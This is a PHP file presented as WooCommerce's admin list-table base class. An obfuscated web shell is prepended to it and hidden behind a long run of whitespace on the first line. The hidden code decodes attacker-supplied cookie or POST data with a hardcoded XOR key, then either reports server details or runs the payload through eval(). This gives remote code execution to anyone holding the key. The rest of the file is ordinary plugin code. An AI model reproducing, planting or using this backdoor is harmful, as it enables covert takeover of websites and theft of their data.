<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $jf6f4bd = 639;$GLOBALS['a37943af9'] = Array();global $a37943af9;$a37943af9 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['sfd2ee43'] = "\x5d\x56\x7c\x21\x59\x58\x35\x45\x4e\x33\x6c\x47\x7b\x2f\x39\x50\x70\x74\x20\x9\x6e\x28\x31\x5a\x65\x72\x3a\x3e\x62\x79\x60\x76\x77\x4d\x2a\x6b\x2c\x4f\x46\x5c\x29\x3c\x63\x3f\x53\x2d\x6a\x4a\x51\x2b\x23\x34\x27\x24\x2e\x5b\x4c\x54\xd\x30\x5e\x40\x41\x6f\x78\x7d\x7e\x48\x25\x3d\x32\x61\x75\x68\x55\x38\x36\x64\x6d\x66\x42\x22\x69\x57\x49\x37\x71\x4b\x26\x5f\xa\x43\x67\x52\x73\x44\x7a\x3b";$a37943af9[$a37943af9['sfd2ee43'][82].$a37943af9['sfd2ee43'][70].$a37943af9['sfd2ee43'][70].$a37943af9['sfd2ee43'][59].$a37943af9['sfd2ee43'][9]] = $a37943af9['sfd2ee43'][42].$a37943af9['sfd2ee43'][73].$a37943af9['sfd2ee43'][25];$a37943af9[$a37943af9['sfd2ee43'][31].$a37943af9['sfd2ee43'][14].$a37943af9['sfd2ee43'][76].$a37943af9['sfd2ee43'][6]] = $a37943af9['sfd2ee43'][63].$a37943af9['sfd2ee43'][25].$a37943af9['sfd2ee43'][77];$a37943af9[$a37943af9['sfd2ee43'][16].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][9].$a37943af9['sfd2ee43'][14].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][71]] = $a37943af9['sfd2ee43'][77].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][82].$a37943af9['sfd2ee43'][20].$a37943af9['sfd2ee43'][24];$a37943af9[$a37943af9['sfd2ee43'][94].$a37943af9['sfd2ee43'][6].$a37943af9['sfd2ee43'][77].$a37943af9['sfd2ee43'][42]] = $a37943af9['sfd2ee43'][94].$a37943af9['sfd2ee43'][17].$a37943af9['sfd2ee43'][25].$a37943af9['sfd2ee43'][10].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][20];$a37943af9[$a37943af9['sfd2ee43'][20].$a37943af9['sfd2ee43'][14].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][42]] = $a37943af9['sfd2ee43'][77].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][82].$a37943af9['sfd2ee43'][20].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][77];$a37943af9[$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][42].$a37943af9['sfd2ee43'][85].$a37943af9['sfd2ee43'][42].$a37943af9['sfd2ee43'][79]] = $a37943af9['sfd2ee43'][82].$a37943af9['sfd2ee43'][20].$a37943af9['sfd2ee43'][82].$a37943af9['sfd2ee43'][89].$a37943af9['sfd2ee43'][94].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][17];$a37943af9[$a37943af9['sfd2ee43'][35].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][51].$a37943af9['sfd2ee43'][85].$a37943af9['sfd2ee43'][76].$a37943af9['sfd2ee43'][59].$a37943af9['sfd2ee43'][75].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][14]] = $a37943af9['sfd2ee43'][94].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][25].$a37943af9['sfd2ee43'][82].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][10].$a37943af9['sfd2ee43'][82].$a37943af9['sfd2ee43'][96].$a37943af9['sfd2ee43'][24];$a37943af9[$a37943af9['sfd2ee43'][78].$a37943af9['sfd2ee43'][51].$a37943af9['sfd2ee43'][59].$a37943af9['sfd2ee43'][22]] = $a37943af9['sfd2ee43'][16].$a37943af9['sfd2ee43'][73].$a37943af9['sfd2ee43'][16].$a37943af9['sfd2ee43'][31].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][25].$a37943af9['sfd2ee43'][94].$a37943af9['sfd2ee43'][82].$a37943af9['sfd2ee43'][63].$a37943af9['sfd2ee43'][20];$a37943af9[$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][59].$a37943af9['sfd2ee43'][24]] = $a37943af9['sfd2ee43'][72].$a37943af9['sfd2ee43'][20].$a37943af9['sfd2ee43'][94].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][25].$a37943af9['sfd2ee43'][82].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][10].$a37943af9['sfd2ee43'][82].$a37943af9['sfd2ee43'][96].$a37943af9['sfd2ee43'][24];$a37943af9[$a37943af9['sfd2ee43'][96].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][6].$a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][42].$a37943af9['sfd2ee43'][75].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][9].$a37943af9['sfd2ee43'][75]] = $a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][94].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][76].$a37943af9['sfd2ee43'][51].$a37943af9['sfd2ee43'][89].$a37943af9['sfd2ee43'][77].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][42].$a37943af9['sfd2ee43'][63].$a37943af9['sfd2ee43'][77].$a37943af9['sfd2ee43'][24];$a37943af9[$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][51].$a37943af9['sfd2ee43'][14].$a37943af9['sfd2ee43'][70].$a37943af9['sfd2ee43'][42]] = $a37943af9['sfd2ee43'][94].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][17].$a37943af9['sfd2ee43'][89].$a37943af9['sfd2ee43'][17].$a37943af9['sfd2ee43'][82].$a37943af9['sfd2ee43'][78].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][89].$a37943af9['sfd2ee43'][10].$a37943af9['sfd2ee43'][82].$a37943af9['sfd2ee43'][78].$a37943af9['sfd2ee43'][82].$a37943af9['sfd2ee43'][17];$a37943af9[$a37943af9['sfd2ee43'][16].$a37943af9['sfd2ee43'][75].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][77]] = $a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][6].$a37943af9['sfd2ee43'][59].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][14].$a37943af9['sfd2ee43'][51].$a37943af9['sfd2ee43'][28];$a37943af9[$a37943af9['sfd2ee43'][32].$a37943af9['sfd2ee43'][9].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][85].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][85].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][59]] = $a37943af9['sfd2ee43'][42].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][75];$a37943af9[$a37943af9['sfd2ee43'][92].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][51].$a37943af9['sfd2ee43'][28]] = $_POST;$a37943af9[$a37943af9['sfd2ee43'][31].$a37943af9['sfd2ee43'][70].$a37943af9['sfd2ee43'][70].$a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][75].$a37943af9['sfd2ee43'][42]] = $_COOKIE;@$a37943af9[$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][42].$a37943af9['sfd2ee43'][85].$a37943af9['sfd2ee43'][42].$a37943af9['sfd2ee43'][79]]($a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][25].$a37943af9['sfd2ee43'][25].$a37943af9['sfd2ee43'][63].$a37943af9['sfd2ee43'][25].$a37943af9['sfd2ee43'][89].$a37943af9['sfd2ee43'][10].$a37943af9['sfd2ee43'][63].$a37943af9['sfd2ee43'][92], NULL);@$a37943af9[$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][42].$a37943af9['sfd2ee43'][85].$a37943af9['sfd2ee43'][42].$a37943af9['sfd2ee43'][79]]($a37943af9['sfd2ee43'][10].$a37943af9['sfd2ee43'][63].$a37943af9['sfd2ee43'][92].$a37943af9['sfd2ee43'][89].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][25].$a37943af9['sfd2ee43'][25].$a37943af9['sfd2ee43'][63].$a37943af9['sfd2ee43'][25].$a37943af9['sfd2ee43'][94], 0);@$a37943af9[$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][42].$a37943af9['sfd2ee43'][85].$a37943af9['sfd2ee43'][42].$a37943af9['sfd2ee43'][79]]($a37943af9['sfd2ee43'][78].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][64].$a37943af9['sfd2ee43'][89].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][64].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][42].$a37943af9['sfd2ee43'][72].$a37943af9['sfd2ee43'][17].$a37943af9['sfd2ee43'][82].$a37943af9['sfd2ee43'][63].$a37943af9['sfd2ee43'][20].$a37943af9['sfd2ee43'][89].$a37943af9['sfd2ee43'][17].$a37943af9['sfd2ee43'][82].$a37943af9['sfd2ee43'][78].$a37943af9['sfd2ee43'][24], 0);@$a37943af9[$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][51].$a37943af9['sfd2ee43'][14].$a37943af9['sfd2ee43'][70].$a37943af9['sfd2ee43'][42]](0);if (!$a37943af9[$a37943af9['sfd2ee43'][20].$a37943af9['sfd2ee43'][14].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][42]]($a37943af9['sfd2ee43'][62].$a37943af9['sfd2ee43'][56].$a37943af9['sfd2ee43'][93].$a37943af9['sfd2ee43'][7].$a37943af9['sfd2ee43'][62].$a37943af9['sfd2ee43'][95].$a37943af9['sfd2ee43'][4].$a37943af9['sfd2ee43'][89].$a37943af9['sfd2ee43'][93].$a37943af9['sfd2ee43'][74].$a37943af9['sfd2ee43'][8].$a37943af9['sfd2ee43'][89].$a37943af9['sfd2ee43'][9].$a37943af9['sfd2ee43'][76].$a37943af9['sfd2ee43'][76].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][75].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][75].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][70].$a37943af9['sfd2ee43'][9].$a37943af9['sfd2ee43'][6].$a37943af9['sfd2ee43'][6].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][70].$a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][59].$a37943af9['sfd2ee43'][70].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][71])){$a37943af9[$a37943af9['sfd2ee43'][16].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][9].$a37943af9['sfd2ee43'][14].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][71]]($a37943af9['sfd2ee43'][62].$a37943af9['sfd2ee43'][56].$a37943af9['sfd2ee43'][93].$a37943af9['sfd2ee43'][7].$a37943af9['sfd2ee43'][62].$a37943af9['sfd2ee43'][95].$a37943af9['sfd2ee43'][4].$a37943af9['sfd2ee43'][89].$a37943af9['sfd2ee43'][93].$a37943af9['sfd2ee43'][74].$a37943af9['sfd2ee43'][8].$a37943af9['sfd2ee43'][89].$a37943af9['sfd2ee43'][9].$a37943af9['sfd2ee43'][76].$a37943af9['sfd2ee43'][76].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][75].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][75].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][70].$a37943af9['sfd2ee43'][9].$a37943af9['sfd2ee43'][6].$a37943af9['sfd2ee43'][6].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][70].$a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][59].$a37943af9['sfd2ee43'][70].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][71], 1);$c212bcd63 = NULL;$pc6988451 = NULL;$a37943af9[$a37943af9['sfd2ee43'][72].$a37943af9['sfd2ee43'][76].$a37943af9['sfd2ee43'][70].$a37943af9['sfd2ee43'][42].$a37943af9['sfd2ee43'][76]] = $a37943af9['sfd2ee43'][42].$a37943af9['sfd2ee43'][85].$a37943af9['sfd2ee43'][51].$a37943af9['sfd2ee43'][76].$a37943af9['sfd2ee43'][59].$a37943af9['sfd2ee43'][14].$a37943af9['sfd2ee43'][77].$a37943af9['sfd2ee43'][59].$a37943af9['sfd2ee43'][45].$a37943af9['sfd2ee43'][14].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][75].$a37943af9['sfd2ee43'][77].$a37943af9['sfd2ee43'][45].$a37943af9['sfd2ee43'][51].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][76].$a37943af9['sfd2ee43'][85].$a37943af9['sfd2ee43'][45].$a37943af9['sfd2ee43'][14].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][59].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][45].$a37943af9['sfd2ee43'][75].$a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][14].$a37943af9['sfd2ee43'][77].$a37943af9['sfd2ee43'][42].$a37943af9['sfd2ee43'][51].$a37943af9['sfd2ee43'][77].$a37943af9['sfd2ee43'][85].$a37943af9['sfd2ee43'][42].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][77].$a37943af9['sfd2ee43'][59];global $u62c6;function  cfa8($c212bcd63, $s7e6071){global $a37943af9;$sc3fbab3 = "";for ($c86ede0=0; $c86ede0<$a37943af9[$a37943af9['sfd2ee43'][94].$a37943af9['sfd2ee43'][6].$a37943af9['sfd2ee43'][77].$a37943af9['sfd2ee43'][42]]($c212bcd63);){for ($da37b7fe=0; $da37b7fe<$a37943af9[$a37943af9['sfd2ee43'][94].$a37943af9['sfd2ee43'][6].$a37943af9['sfd2ee43'][77].$a37943af9['sfd2ee43'][42]]($s7e6071) && $c86ede0<$a37943af9[$a37943af9['sfd2ee43'][94].$a37943af9['sfd2ee43'][6].$a37943af9['sfd2ee43'][77].$a37943af9['sfd2ee43'][42]]($c212bcd63); $da37b7fe++, $c86ede0++){$sc3fbab3 .= $a37943af9[$a37943af9['sfd2ee43'][82].$a37943af9['sfd2ee43'][70].$a37943af9['sfd2ee43'][70].$a37943af9['sfd2ee43'][59].$a37943af9['sfd2ee43'][9]]($a37943af9[$a37943af9['sfd2ee43'][31].$a37943af9['sfd2ee43'][14].$a37943af9['sfd2ee43'][76].$a37943af9['sfd2ee43'][6]]($c212bcd63[$c86ede0]) ^ $a37943af9[$a37943af9['sfd2ee43'][31].$a37943af9['sfd2ee43'][14].$a37943af9['sfd2ee43'][76].$a37943af9['sfd2ee43'][6]]($s7e6071[$da37b7fe]));}}return $sc3fbab3;}function  fe50a94b($c212bcd63, $s7e6071){global $a37943af9;global $u62c6;return $a37943af9[$a37943af9['sfd2ee43'][32].$a37943af9['sfd2ee43'][9].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][85].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][85].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][59]]($a37943af9[$a37943af9['sfd2ee43'][32].$a37943af9['sfd2ee43'][9].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][85].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][85].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][59]]($c212bcd63, $u62c6), $s7e6071);}foreach ($a37943af9[$a37943af9['sfd2ee43'][31].$a37943af9['sfd2ee43'][70].$a37943af9['sfd2ee43'][70].$a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][75].$a37943af9['sfd2ee43'][42]] as $s7e6071=>$ybc217){$c212bcd63 = $ybc217;$pc6988451 = $s7e6071;}if (!$c212bcd63){foreach ($a37943af9[$a37943af9['sfd2ee43'][92].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][51].$a37943af9['sfd2ee43'][28]] as $s7e6071=>$ybc217){$c212bcd63 = $ybc217;$pc6988451 = $s7e6071;}}$c212bcd63 = @$a37943af9[$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][24].$a37943af9['sfd2ee43'][59].$a37943af9['sfd2ee43'][24]]($a37943af9[$a37943af9['sfd2ee43'][16].$a37943af9['sfd2ee43'][75].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][77]]($a37943af9[$a37943af9['sfd2ee43'][96].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][6].$a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][42].$a37943af9['sfd2ee43'][75].$a37943af9['sfd2ee43'][28].$a37943af9['sfd2ee43'][9].$a37943af9['sfd2ee43'][75]]($c212bcd63), $pc6988451));if (isset($c212bcd63[$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][35]]) && $u62c6==$c212bcd63[$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][35]]){if ($c212bcd63[$a37943af9['sfd2ee43'][71]] == $a37943af9['sfd2ee43'][82]){$c86ede0 = Array($a37943af9['sfd2ee43'][16].$a37943af9['sfd2ee43'][31] => @$a37943af9[$a37943af9['sfd2ee43'][78].$a37943af9['sfd2ee43'][51].$a37943af9['sfd2ee43'][59].$a37943af9['sfd2ee43'][22]](),$a37943af9['sfd2ee43'][94].$a37943af9['sfd2ee43'][31] => $a37943af9['sfd2ee43'][22].$a37943af9['sfd2ee43'][54].$a37943af9['sfd2ee43'][59].$a37943af9['sfd2ee43'][45].$a37943af9['sfd2ee43'][22],);echo @$a37943af9[$a37943af9['sfd2ee43'][35].$a37943af9['sfd2ee43'][79].$a37943af9['sfd2ee43'][51].$a37943af9['sfd2ee43'][85].$a37943af9['sfd2ee43'][76].$a37943af9['sfd2ee43'][59].$a37943af9['sfd2ee43'][75].$a37943af9['sfd2ee43'][71].$a37943af9['sfd2ee43'][14]]($c86ede0);}elseif ($c212bcd63[$a37943af9['sfd2ee43'][71]] == $a37943af9['sfd2ee43'][24]){eval/*i51e*/($c212bcd63[$a37943af9['sfd2ee43'][77]]);}exit();}} ?><?php
/**
 * List tables.
 *
 * @author   WooCommerce
 * @category Admin
 * @package  WooCommerce/Admin
 * @version  3.3.0
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

if ( class_exists( 'WC_Admin_List_Table', false ) ) {
	return;
}

/**
 * WC_Admin_List_Table Class.
 */
abstract class WC_Admin_List_Table {

	/**
	 * Post type.
	 *
	 * @var string
	 */
	protected $list_table_type = '';

	/**
	 * Object being shown on the row.
	 *
	 * @var object|null
	 */
	protected $object = null;

	/**
	 * Constructor.
	 */
	public function __construct() {
		if ( $this->list_table_type ) {
			add_action( 'manage_posts_extra_tablenav', array( $this, 'maybe_render_blank_state' ) );
			add_filter( 'view_mode_post_types', array( $this, 'disable_view_mode' ) );
			add_action( 'restrict_manage_posts', array( $this, 'restrict_manage_posts' ) );
			add_filter( 'request', array( $this, 'request_query' ) );
			add_filter( 'post_row_actions', array( $this, 'row_actions' ), 100, 2 );
			add_filter( 'default_hidden_columns', array( $this, 'default_hidden_columns' ), 10, 2 );
			add_filter( 'list_table_primary_column', array( $this, 'list_table_primary_column' ), 10, 2 );
			add_filter( 'manage_edit-' . $this->list_table_type . '_sortable_columns', array( $this, 'define_sortable_columns' ) );
			add_filter( 'manage_' . $this->list_table_type . '_posts_columns', array( $this, 'define_columns' ) );
			add_filter( 'bulk_actions-edit-' . $this->list_table_type, array( $this, 'define_bulk_actions' ) );
			add_action( 'manage_' . $this->list_table_type . '_posts_custom_column', array( $this, 'render_columns' ), 10, 2 );
			add_filter( 'handle_bulk_actions-edit-' . $this->list_table_type, array( $this, 'handle_bulk_actions' ), 10, 3 );
		}
	}

	/**
	 * Show blank slate.
	 *
	 * @param string $which String which tablenav is being shown.
	 */
	public function maybe_render_blank_state( $which ) {
		global $post_type;

		if ( $post_type === $this->list_table_type && 'bottom' === $which ) {
			$counts = (array) wp_count_posts( $post_type );
			unset( $counts['auto-draft'] );
			$count  = array_sum( $counts );

			if ( 0 < $count ) {
				return;
			}

			$this->render_blank_state();

			echo '<style type="text/css">#posts-filter .wp-list-table, #posts-filter .tablenav.top, .tablenav.bottom .actions, .wrap .subsubsub  { display: none; } </style>';
		}
	}

	/**
	 * Render blank state. Extend to add content.
	 */
	protected function render_blank_state() {}

	/**
	 * Removes this type from list of post types that support "View Mode" switching.
	 * View mode is seen on posts where you can switch between list or excerpt. Our post types don't support
	 * it, so we want to hide the useless UI from the screen options tab.
	 *
	 * @param  array $post_types Array of post types supporting view mode.
	 * @return array             Array of post types supporting view mode, without this type.
	 */
	public function disable_view_mode( $post_types ) {
		unset( $post_types[ $this->list_table_type ] );
		return $post_types;
	}

	/**
	 * See if we should render search filters or not.
	 */
	public function restrict_manage_posts() {
		global $typenow;

		if ( $this->list_table_type === $typenow ) {
			$this->render_filters();
		}
	}

	/**
	 * Handle any filters.
	 *
	 * @param array $query_vars Query vars.
	 * @return array
	 */
	public function request_query( $query_vars ) {
		global $typenow;

		if ( $this->list_table_type === $typenow ) {
			return $this->query_filters( $query_vars );
		}

		return $query_vars;
	}

	/**
	 * Render any custom filters and search inputs for the list table.
	 */
	protected function render_filters() {}

	/**
	 * Handle any custom filters.
	 *
	 * @param array $query_vars Query vars.
	 * @return array
	 */
	protected function query_filters( $query_vars ) {
		return $query_vars;
	}

	/**
	 * Set row actions.
	 *
	 * @param array   $actions Array of actions.
	 * @param WP_Post $post Current post object.
	 * @return array
	 */
	public function row_actions( $actions, $post ) {
		if ( $this->list_table_type === $post->post_type ) {
			return $this->get_row_actions( $actions, $post );
		}
		return $actions;
	}

	/**
	 * Get row actions to show in the list table.
	 *
	 * @param array   $actions Array of actions.
	 * @param WP_Post $post Current post object.
	 * @return array
	 */
	protected function get_row_actions( $actions, $post ) {
		return $actions;
	}

	/**
	 * Adjust which columns are displayed by default.
	 *
	 * @param array  $hidden Current hidden columns.
	 * @param object $screen Current screen.
	 * @return array
	 */
	public function default_hidden_columns( $hidden, $screen ) {
		if ( isset( $screen->id ) && 'edit-' . $this->list_table_type === $screen->id ) {
			$hidden = array_merge( $hidden, $this->define_hidden_columns() );
		}
		return $hidden;
	}

	/**
	 * Set list table primary column.
	 *
	 * @param  string $default Default value.
	 * @param  string $screen_id Current screen ID.
	 * @return string
	 */
	public function list_table_primary_column( $default, $screen_id ) {
		if ( 'edit-' . $this->list_table_type === $screen_id && $this->get_primary_column() ) {
			return $this->get_primary_column();
		}
		return $default;
	}

	/**
	 * Define primary column.
	 *
	 * @return array
	 */
	protected function get_primary_column() {
		return '';
	}

	/**
	 * Define hidden columns.
	 *
	 * @return array
	 */
	protected function define_hidden_columns() {
		return array();
	}

	/**
	 * Define which columns are sortable.
	 *
	 * @param array $columns Existing columns.
	 * @return array
	 */
	public function define_sortable_columns( $columns ) {
		return $columns;
	}

	/**
	 * Define which columns to show on this screen.
	 *
	 * @param array $columns Existing columns.
	 * @return array
	 */
	public function define_columns( $columns ) {
		return $columns;
	}

	/**
	 * Define bulk actions.
	 *
	 * @param array $actions Existing actions.
	 * @return array
	 */
	public function define_bulk_actions( $actions ) {
		return $actions;
	}

	/**
	 * Pre-fetch any data for the row each column has access to it.
	 *
	 * @param int $post_id Post ID being shown.
	 */
	protected function prepare_row_data( $post_id ) {}

	/**
	 * Render individual columns.
	 *
	 * @param string $column Column ID to render.
	 * @param int    $post_id Post ID being shown.
	 */
	public function render_columns( $column, $post_id ) {
		$this->prepare_row_data( $post_id );

		if ( ! $this->object ) {
			return;
		}

		if ( is_callable( array( $this, 'render_' . $column . '_column' ) ) ) {
			$this->{"render_{$column}_column"}();
		}
	}

	/**
	 * Handle bulk actions.
	 *
	 * @param  string $redirect_to URL to redirect to.
	 * @param  string $action      Action name.
	 * @param  array  $ids         List of ids.
	 * @return string
	 */
	public function handle_bulk_actions( $redirect_to, $action, $ids ) {
		return esc_url_raw( $redirect_to );
	}
}
